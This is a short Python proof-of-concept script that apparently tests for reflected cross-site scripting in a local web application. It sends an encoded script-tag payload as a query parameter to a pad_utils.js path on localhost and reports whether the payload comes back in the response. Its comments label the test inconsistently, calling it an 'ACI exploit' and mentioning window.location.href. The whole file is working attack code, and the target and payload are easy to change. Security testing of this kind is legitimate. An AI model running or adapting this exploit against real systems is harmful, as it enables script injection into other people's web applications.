import requests
from urllib.parse import quote

# The URL of the vulnerable application
url = 'http://localhost:9001/p/pad_utils.js'

# Malicious JavaScript code to be injected
malicious_script = "<script>alert('XSS');</script>"

# Encoded script to be injected into window.location.href
encoded_script = quote(malicious_script)

# Constructing the exploit URL
exploit_url = f"{url}?param={encoded_script}"

# Sending the request to the exploit URL
response = requests.get(exploit_url)

# Checking if the malicious script is reflected in the response
if malicious_script in response.text:
    print("The ACI exploit success!!!")
else:
    print("The ACI exploit failed!!!")
